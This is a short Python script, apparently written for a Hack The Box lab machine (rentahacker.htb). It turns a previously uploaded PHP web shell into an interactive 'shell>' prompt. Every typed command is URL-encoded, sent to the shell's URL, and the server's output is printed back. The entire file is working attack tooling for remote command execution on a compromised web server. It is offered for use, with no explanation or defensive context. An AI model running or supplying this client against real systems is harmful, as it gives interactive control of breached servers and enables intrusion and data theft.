#!/usr/bin/env python3
#after uploading a cmd shell
#usage http://sec03.rentahacker.htb/shell.php?hidden=
 
import requests 
import argparse
from urllib.parse import quote
from cmd import Cmd

parser = argparse.ArgumentParser()
parser.add_argument("-t","--target", help="provide the exact url location of the webshell i.e. http://<host>/shell.php?cmd=", required=True)
cmdargs = parser.parse_args()

class Terminal(Cmd):
 def __init__(self):
   self.prompt = "shell> "
   Cmd.__init__(self)

 def default(self, args):
       r = requests.post(cmdargs.target + quote(args)) 
       print(r.text)

terminal = Terminal()
terminal.cmdloop()
